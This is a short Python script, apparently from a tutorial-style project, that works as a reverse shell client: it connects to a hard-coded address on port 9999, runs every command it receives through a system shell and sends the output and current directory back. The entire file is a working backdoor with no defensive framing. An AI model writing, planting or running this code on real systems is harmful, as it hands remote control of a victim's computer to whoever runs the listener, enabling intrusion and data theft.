import socket 
import os 
import subprocess

# find ip/host address using ipconfig
s = socket.socket()
host = "192.168.0.193"
port = 9999

# binding client socket
s.connect((host, port))

while True:
    data = s.recv(20480)
    if data[:2].decode("utf-8") == "cd":
        os.chdir(data[3:].decode("utf-8"))
    
    if len(data) > 0:
        # opens a process/terminal in client pc
        cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
        # getting output and error(if any) of command
        output_byte = cmd.stdout.read() + cmd.stderr.read()
        output_str = str(output_byte, "utf-8")
        currentWD = os.getcwd() + "> "
        s.send(str.encode(output_str + currentWD))
        
        # if client is friend, print the outputs on client pc as well
        print(output_str)